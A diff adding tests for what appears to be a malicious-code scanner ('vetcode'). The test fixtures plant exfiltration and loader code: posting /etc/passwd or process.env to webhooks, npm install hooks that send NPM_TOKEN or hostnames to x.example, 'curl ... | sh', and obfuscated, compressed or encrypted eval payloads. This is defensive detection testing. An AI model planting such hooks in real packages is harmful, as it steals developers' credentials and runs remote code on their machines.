@@ -354,6 +354,100 @@ test("GitHub review: only our own threads whose finding is gone are resolved", (
   assert.deepEqual(staleThreads(threads, new Set(["bbb"])), ["fixed"]);
 });
 
+test("code hidden with split strings, escapes or a base64 payload is still found", async () => {
+  const hex = s => [...s].map(c => "\\x" + c.charCodeAt(0).toString(16).padStart(2, "0")).join("");
+  const packed = Buffer.from(Array.from({ length: 10 }, (_, i) => `var _0x${(0xa1b2 + i).toString(16)} = ${i};`).join("\n")).toString("base64");
+  const r = await run(project({
+    "hex.py": `import requests\nrequests.post("${hex("https://webhook.site/abc")}", data=open("/etc/passwd").read())\n`,
+    "split.js": `fetch("https://discord.com/api/web" + "hooks/1/abc", { method: "POST", body: JSON.stringify(process.env) });\n`,
+    "packed.js": `eval(Buffer.from("${packed}", "base64").toString());\n`,
+  }), { noIgnore: true });
+  const hidden = r.findings.filter(f => / \(hidden\)$/.test(f.title)).map(f => `${f.file} ${f.rule}`);
+  assert.ok(hidden.includes("hex.py mal-oast-endpoint"), hidden.join(", "));
+  assert.ok(hidden.includes("split.js mal-exfil-endpoint"), hidden.join(", "));
+  assert.ok(hidden.includes("packed.js mal-obfuscator"), hidden.join(", "));
+  assert.equal(r.findings.find(f => f.file === "packed.js" && f.rule === "mal-obfuscator").line, 1);
+
+  const clean = await run(project({
+    "i18n.js": `const msg = "Caf\\u00e9 " + "ouvert";\nconst url = "https://api.example" + ".com/v1";\nconst nl = "line\\x0a";\n`,
+  }), { noIgnore: true });
+  assert.deepEqual(clean.findings.filter(f => / \(hidden\)$/.test(f.title)).map(f => f.rule), []);
+});
+
+test("long lines cannot stall the scan (no catastrophic backtracking)", async () => {
+  // A 500 KB base64 payload on one line once made a rule backtrack for minutes.
+  const blob = "QUFB".repeat(130000);
+  const t0 = performance.now();
+  await run(project({ "pkg/__init__.py": `exec(__import__("base64").b64decode("${blob}"))\n`, "words.js": "abc ".repeat(80000), "eq.py": "a=".repeat(100000) }), { noIgnore: true });
+  assert.ok(performance.now() - t0 < 15000, `scan took ${Math.round(performance.now() - t0)} ms`);
+});
+
+test("install code hidden in other files, encodings and shipped programs", async () => {
+  const pkg = (scripts, extra = {}) => JSON.stringify({ name: "acme-tool", version: "1.0.0", scripts, ...extra });
+  const steal = j("const os = require('os'); const https = require('https');\nhttps.get('https://x.example/' + os.hostname() + '/' + process.env.NPM_TO", "KEN);\n");
+  const utf16 = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(Array.from({ length: 10 }, (_, i) => `var _0x${(0xa1b2 + i).toString(16)} = ${i};`).join("\n"), "utf16le")]);
+  const cases = {
+    "install-time-capabilities (required file)": { "package.json": pkg({ postinstall: "node setup.js" }), "setup.js": "require('./lib/run');\n", "lib/run.js": steal },
+    "install-time-capabilities (node .)": { "package.json": pkg({ postinstall: "node ." }, { main: "main.js" }), "main.js": steal },
+    "install-runs-test-file": { "package.json": pkg({ preinstall: "node ./test/fixtures/setup.js" }), "test/fixtures/setup.js": "console.log(1)\n" },
+    "install-runs-bundled-program": { "package.json": pkg({ postinstall: "node index.js" }), "index.js": "require('child_process').spawn(require('path').resolve('Setup.exe'), { detached: true });\n" },
+    "mal-decrypt-then-run": { "loader.js": "const c = require('crypto').createDecipheriv('aes-256-cbc', k, iv);\nlet s = c.update(data, 'base64', 'utf8') + c.final('utf8');\nnew Function('require', s)(require);\n" },
+    "mal-obfuscator (UTF-16 file)": { "dist/app.js": utf16 },
+  };
+  for (const [name, files] of Object.entries(cases)) {
+    const id = name.split(" ")[0];
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "vetcode-"));
+    for (const [rel, body] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true }); fs.writeFileSync(path.join(dir, rel), body); }
+    const r = await run(dir, { noIgnore: true });
+    assert.ok(r.findings.some(f => f.rule === id && f.confidence !== "low"), name);
+  }
+  const code = "const {exec}=require('child_process');\nconst os=require('os');\nexec('curl -s http://x.example/p?h='+os.hostname()+' | sh');\n";
+  const hexOfB64 = Buffer.from(Buffer.from(code).toString("base64")).toString("hex");
+  const r = await run(project({ "x.js": `const p = '${hexOfB64}';\nmodule.exports = p;\n` }), { noIgnore: true });
+  assert.ok(r.findings.some(f => / \(hidden\)$/.test(f.title)), "hex of base64 code is decoded and scanned");
+
+  const clean = await run(project({
+    "package.json": pkg({ postinstall: "node scripts/postinstall.js" }), "scripts/postinstall.js": "require('./banner');\n", "scripts/banner.js": "console.log('Thanks for installing');\n",
+    "notify.js": "require('child_process').spawn(require('path').join(__dirname, 'vendor', 'SnoreToast.exe'), args);\n",
+    "img.js": `export const logo = "${Buffer.from(Array.from({ length: 400 }, (_, i) => i % 256)).toString("base64")}";\n`,
+  }), { noIgnore: true });
+  assert.deepEqual(clean.findings.filter(f => ["install-time-capabilities", "install-time-network", "install-runs-bundled-program", "install-runs-test-file"].includes(f.rule) || / \(hidden\)$/.test(f.title)).map(f => `${f.rule} ${f.file}`), []);
+});
+
+test("compressed payloads are inflated (with a size cap) and scanned", async () => {
+  const zlib = await import("node:zlib");
+  const code = j("const {exec} = require('child_process');\nconst os = require('os');\nexec('cu", "rl -s https://x.example/p?h=' + os.hostname() + ' | sh');\n");
+  const r = await run(project({
+    "a.js": `eval(require("zlib").gunzipSync(Buffer.from("${zlib.gzipSync(Buffer.from(code)).toString("base64")}", "base64")).toString());\n`,
+    "b.js": `const s = "${zlib.brotliCompressSync(Buffer.from(code)).toString("base64")}";\nmodule.exports = s;\n`,
+    "c.py": `exec(__import__("zlib").decompress(__import__("base64").b64decode("${zlib.deflateSync(Buffer.from(code.replace(/require/g, "rq"))).toString("base64")}")))\n`,
+  }), { noIgnore: true });
+  const hidden = new Set(r.findings.filter(f => / \(hidden\)$/.test(f.title)).map(f => f.file));
+  assert.ok(hidden.has("a.js") && hidden.has("b.js"), [...hidden].join(","));
+  // A 50 MB "bomb" is stopped at the cap instead of filling memory.
+  const t0 = performance.now();
+  await run(project({ "bomb.js": `const x = "${zlib.gzipSync(Buffer.alloc(50 << 20, 65)).toString("base64")}";\n` }), { noIgnore: true });
+  assert.ok(performance.now() - t0 < 10000);
+});
+
+test("install hooks that report identity, hidden starts, obfuscated code", async () => {
+  const pkg = scripts => JSON.stringify({ name: "acme-web", version: "3.5.0", scripts });
+  const hexy = Array.from({ length: 80 }, (_, i) => `a[b<-0x${(i + 16).toString(16)}?b-0x${i.toString(16)}:b+0x2]`).join(";");
+  const decoder = "var d=function(i){return t[i-0x0]};" + Array.from({ length: 50 }, (_, i) => `x[d(0x${i.toString(16)})]`).join(";");
+  const cases = {
+    "install-hook-exfil": { "package.json": pkg({ preinstall: "ping -c 1 $USER$HOSTNAME.lp.x.example" }) },
+    "install-background": { "package.json": pkg({ preinstall: "start /B node compile.js & node compile.js" }), "compile.js": "1\n" },
+    "install-runs-obfuscated-code": { "package.json": pkg({ postinstall: "node config.js" }), "config.js": hexy },
+    "mal-obfuscated-js": { "index.js": decoder },
+  };
+  for (const [id, files] of Object.entries(cases)) assert.ok(rules(await run(project(files), { noIgnore: true })).has(id), id);
+  const clean = await run(project({
+    "package.json": pkg({ postinstall: "node scripts/check.js" }), "scripts/check.js": "console.log(process.platform)\n",
+    "sha.js": "const K = [" + Array.from({ length: 64 }, (_, i) => `0x${(0x428a2f98 + i).toString(16)}`).join(", ") + "];\nmodule.exports = K;\n",
+  }), { noIgnore: true });
+  assert.deepEqual(clean.findings.filter(f => ["install-hook-exfil", "install-background", "install-runs-obfuscated-code", "mal-obfuscated-js"].includes(f.rule)).map(f => f.rule), []);
+});
+
 test("CLI prints a report and --fail-on sets the exit code", () => {
   const dir = project({ "a.js": j("eval(at", "ob(x));\n") });
   const cli = path.resolve("skills/vetcode/scripts/vet.mjs");
